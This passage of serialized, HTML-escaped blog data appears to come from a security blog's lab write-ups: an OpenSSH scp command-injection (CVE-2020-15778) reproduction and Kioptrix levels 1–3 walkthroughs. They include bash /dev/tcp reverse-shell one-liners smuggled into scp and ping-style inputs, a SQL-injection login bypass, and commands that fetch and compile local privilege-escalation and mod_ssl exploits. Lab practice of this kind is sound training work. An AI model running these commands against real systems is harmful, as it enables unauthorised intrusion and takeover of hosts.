class=\&quot;line\&quot;&gt;&lt;span&gt;nc -lvvp 4444&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用scp命令注入反弹shell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;scp 1.txt i@192.168.100.28:&#39;`bash -i &gt;&amp;#x26; /dev/tcp/192.168.100.238/4444 0&gt;&amp;#x26;1`/tmp/test.txt&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/p1.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/p2.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞描述&quot;],&quot;text&quot;:[0,&quot;漏洞描述&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;适用场景&quot;],&quot;text&quot;:[0,&quot;适用场景&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞等级&quot;],&quot;text&quot;:[0,&quot;漏洞等级&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞影响版本&quot;],&quot;text&quot;:[0,&quot;漏洞影响版本&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞复现&quot;],&quot;text&quot;:[0,&quot;漏洞复现&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/p1.png&quot;],[0,&quot;img/p2.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;CVE-2020-15778-OpenSSH命令注入漏洞复现&quot;],&quot;date&quot;:[3,&quot;2026-01-19T01:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;CVE-2020-15778&quot;],[0,&quot;SSH&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/p1.png&quot;],[0,&quot;img/p2.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/20&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-3&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 3&quot;],&quot;date&quot;:[3,&quot;2023-03-22T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -T4 -O -p- 192.168.124.146\nnmap --script vuln -p- 192.168.124.146\ndirb http://192.168.124.146 /usr/share/wordlists/dirb/big.txt\nnikto -host 192.168.124.146\n```\n# Method-1\n## Get shell\nWe find a login page which buid with lotuscms.\n![](img/1679477677475.png)\n![](img/1679477546500.png)\nAttention,meterpreter is unavailable sometimes.We need to change payload.\n![](img/1679477759672.png)\n## Privilege escalation\nThe information of this system is as follows.\n![](img/1679477868752.png)\n\n# Enclosure\n![](img/1679457478123.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 3.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679477677475.png&quot;],[0,&quot;img/1679477546500.png&quot;],[0,&quot;img/1679477759672.png&quot;],[0,&quot;img/1679477868752.png&quot;],[0,&quot;img/1679457478123.png&quot;]]],&quot;digest&quot;:[0,&quot;551ef77a13682a84&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -T4 -O -p- 192.168.124.146&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln -p- 192.168.124.146&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.146 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto -host 192.168.124.146&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;get-shell\&quot;&gt;Get shell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#get-shell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;We find a login page which buid with lotuscms.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477677475.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477546500.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nAttention,meterpreter is unavailable sometimes.We need to change payload.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477759672.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The information of this system is as follows.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477868752.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679457478123.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;get-shell&quot;],&quot;text&quot;:[0,&quot;Get shell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679477677475.png&quot;],[0,&quot;img/1679477546500.png&quot;],[0,&quot;img/1679477759672.png&quot;],[0,&quot;img/1679477868752.png&quot;],[0,&quot;img/1679457478123.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 3&quot;],&quot;date&quot;:[3,&quot;2023-03-22T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679477677475.png&quot;],[0,&quot;img/1679477546500.png&quot;],[0,&quot;img/1679477759672.png&quot;],[0,&quot;img/1679477868752.png&quot;],[0,&quot;img/1679457478123.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/13&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-2&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 2&quot;],&quot;date&quot;:[3,&quot;2023-03-21T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Infromation gathering\n\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -T4 -p- 192.168.124.145\nnmap --script vuln 192.168.124.145\ndirb http://192.168.124.145 /usr/share/wordlists/dirb/big.txt\nnikto -host 192.168.124.145\n```\n\n# Method-1\n## Get a shell\nThere is a sql injection vulnerability in log in page.\n```\nsqlmap -r 1.txt --level 3 --risk 3 --threads 10 --dbms mysql --current-db\n```\n![](img/1679451569042.png)\n![](img/1679452250882.png)\nOr we can use universal password to log in.\n```\n&#39; or &#39;1&#39;=&#39;1\n```\nNext,there is a commond injection.\n![](img/1679452390583.png)\n![](img/1679452397248.png)\n```\nnc -lvnp 9999                       [ //]:Run this commond on kali\n127.0.0.1&amp;bash -i &gt;&amp; /dev/tcp/192.168.124.4/9999 0&gt;&amp;1\n```\n![](img/1679453259787.png)\n## Privilege escalaion\n\n```\nsearchsploit RHEL 4\n```\n![](img/1679455848121.png)\nUse 9545.c\nExcute these commonds on kali\n```\nsearch -m 9545\n```\n```\npython3 -m http.server 9999\n```\nExcute these commonds on shell\n```\ncd /tmp\nwget http://192.168.124.4:9999/9545.c\ngcc -o 9545 9545.c\nchmod a+x 9545\n./9545\n```\n\n\n\n\n# Enclusure\n![](img/1679451049608.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 2.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679451569042.png&quot;],[0,&quot;img/1679452250882.png&quot;],[0,&quot;img/1679452390583.png&quot;],[0,&quot;img/1679452397248.png&quot;],[0,&quot;img/1679453259787.png&quot;],[0,&quot;img/1679455848121.png&quot;],[0,&quot;img/1679451049608.png&quot;]]],&quot;digest&quot;:[0,&quot;2cf00f8212204a8a&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;infromation-gathering\&quot;&gt;Infromation gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#infromation-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -T4 -p- 192.168.124.145&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.145&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.145 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto -host 192.168.124.145&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;get-a-shell\&quot;&gt;Get a shell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#get-a-shell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;There is a sql injection vulnerability in log in page.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sqlmap -r 1.txt --level 3 --risk 3 --threads 10 --dbms mysql --current-db&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679451569042.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679452250882.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nOr we can use universal password to log in.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&#39; or &#39;1&#39;=&#39;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Next,there is a commond injection.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679452390583.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679452397248.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -lvnp 9999                       [ //]:Run this commond on kali&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;127.0.0.1&amp;#x26;bash -i &gt;&amp;#x26; /dev/tcp/192.168.124.4/9999 0&gt;&amp;#x26;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679453259787.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;privilege-escalaion\&quot;&gt;Privilege escalaion&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalaion\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit RHEL 4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679455848121.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nUse 9545.c\nExcute these commonds on kali&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;search -m 9545&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python3 -m http.server 9999&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Excute these commonds on shell&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cd /tmp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wget http://192.168.124.4:9999/9545.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -o 9545 9545.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod a+x 9545&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./9545&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;enclusure\&quot;&gt;Enclusure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclusure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679451049608.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;infromation-gathering&quot;],&quot;text&quot;:[0,&quot;Infromation gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;get-a-shell&quot;],&quot;text&quot;:[0,&quot;Get a shell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalaion&quot;],&quot;text&quot;:[0,&quot;Privilege escalaion&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclusure&quot;],&quot;text&quot;:[0,&quot;Enclusure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679451569042.png&quot;],[0,&quot;img/1679452250882.png&quot;],[0,&quot;img/1679452390583.png&quot;],[0,&quot;img/1679452397248.png&quot;],[0,&quot;img/1679453259787.png&quot;],[0,&quot;img/1679455848121.png&quot;],[0,&quot;img/1679451049608.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 2&quot;],&quot;date&quot;:[3,&quot;2023-03-21T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679451569042.png&quot;],[0,&quot;img/1679452250882.png&quot;],[0,&quot;img/1679452390583.png&quot;],[0,&quot;img/1679452397248.png&quot;],[0,&quot;img/1679453259787.png&quot;],[0,&quot;img/1679455848121.png&quot;],[0,&quot;img/1679451049608.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/12&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-1&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -T4 -sV -O 192.168.124.140 -p-\nnmap --script vuln 192.168.124.140 -p-\ndirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt\n```\n# Method-1  Samba\n![](img/1679306030928.png)\nAttentions please,meterpreter is not availiable\nIt&#39;s root.There is no need to escalate privilege.\n\n# Method-2 OpenFuck mod_ssl vulnerability\n```\nsearchsploit mod_ssl 2.8.4\n```\n![](img/1679366939593.png)\n```\nsearchsploit -p 47080\n```\n\n![](img/1679366949376.png)\n\n![](img/1679366954478.png)\nWe need install libssl-dev first.\n```\ngcc -o OpenFuck 47080.c -lcrypto\n./OpenFuck\n./OpenFuck 0x6b 192.168.124.140 443 -c 40\n```\nThere are some errors in compile process.\n\n# Enclosure\n![](img/1678960944499.png)\n\n![](img/1678960950947.png)\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners: \n|   cpe:/a:openbsd:openssh:2.9p2: \n|       CVE-2002-0640   